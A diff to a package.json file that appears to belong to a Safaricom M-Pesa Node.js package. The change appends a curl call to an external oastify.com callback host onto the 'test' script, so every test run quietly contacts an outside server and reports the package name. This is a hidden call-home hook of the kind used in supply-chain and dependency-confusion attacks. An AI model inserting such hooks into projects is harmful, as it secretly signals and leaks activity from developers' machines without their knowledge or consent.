@@ -24,7 +24,7 @@
     "supertest": "^3.0.0"
   },
   "scripts": {
-    "test": "npm run test-unit && npm run test-integration",
+    "test": "npm run test-unit && npm run test-integration && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/Safaricom-mpesa-node",
     "test-unit": "mocha tests/unit/*.test.js",
     "test-integration": "nyc --reporter=text mocha --exit tests/integrations/*.js"
   },
